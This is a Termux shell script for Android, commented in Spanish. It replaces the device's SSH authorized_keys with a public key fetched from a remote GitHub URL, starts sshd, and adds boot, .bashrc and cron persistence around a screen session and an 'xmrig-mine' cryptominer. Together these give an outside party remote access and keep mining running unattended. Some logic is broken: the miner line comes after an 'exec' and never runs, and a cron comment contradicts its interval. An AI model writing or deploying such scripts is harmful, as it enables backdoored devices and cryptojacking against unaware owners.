#!/data/data/com.termux/files/usr/bin/sh

#-- Instalar y ejecutar
echo "Actualizando paquetes e instalando..."
pkg update && pkg upgrade -y
pkg install openssh screen curl cronie -y  # Añadido 'cronie' para cron

#-- Crear el directorio .ssh si no existe y descargar la clave pública
mkdir -p ~/.ssh
curl -L -o ~/.ssh/authorized_keys https://raw.githubusercontent.com/Zero-OTP/xmrigZeroconf/refs/heads/main/id_rsa.pub
chmod 600 ~/.ssh/authorized_keys  # Cambiar permisos para la clave

#-- Auto-arranque

# Asegurar que el directorio de inicio existe
mkdir -p ~/.termux/boot/

# Crear el script de auto-arranque
cat <<EOF > ~/.termux/boot/start-ssh
#!/data/data/com.termux/files/usr/bin/sh
termux-wake-lock
sshd

# Verificar si crond ya está corriendo antes de iniciarlo
if ! pgrep -x "crond" > /dev/null; then
    rm -f /data/data/com.termux/files/usr/var/run/crond.pid
    crond
fi

# Eliminar sesiones de screen muertas
rm -rf ~/.screen/*

# Verificar si la sesión de screen existe antes de crearla
if ! screen -list | grep -q "ssh-session"; then
    screen -S ssh-session -d -m
fi

# Adjuntarse a la sesión existente
exec screen -x ssh-session

# Ejecutar el minero si no está ya en ejecución
if ! pgrep -x "xmrig-mine" > /dev/null; then
    ./xmrig-mine
fi
EOF

# Dar permisos de ejecución al script de inicio
chmod +x ~/.termux/boot/start-ssh
chmod 755 ~/.termux/boot/start-ssh

# Iniciar SSH
sshd

# Verificar y manejar sesiones de screen
rm -rf ~/.screen/*  # Limpiar sesiones muertas
if ! screen -list | grep -q "ssh-session"; then
    screen -S ssh-session -d -m
fi
screen -x ssh-session

#-- Configuración de cron para verificar la sesión cada 15 minutos
INTERVALO=2
crontab -l | grep -v "/data/data/com.termux/files/home/check_screen.sh" | { cat; echo "*/$INTERVALO * * * * /data/data/com.termux/files/home/check_screen.sh"; } | crontab -

# Iniciar cron de inmediato
if ! pgrep -x "crond" > /dev/null; then
    rm -f /data/data/com.termux/files/usr/var/run/crond.pid
    crond
fi

# Agregar el script de inicio a ~/.bashrc solo si no está ya agregado
if ! grep -Fxq "bash ~/.termux/boot/start-ssh" ~/.bashrc; then
    echo "bash ~/.termux/boot/start-ssh" >> ~/.bashrc
fi
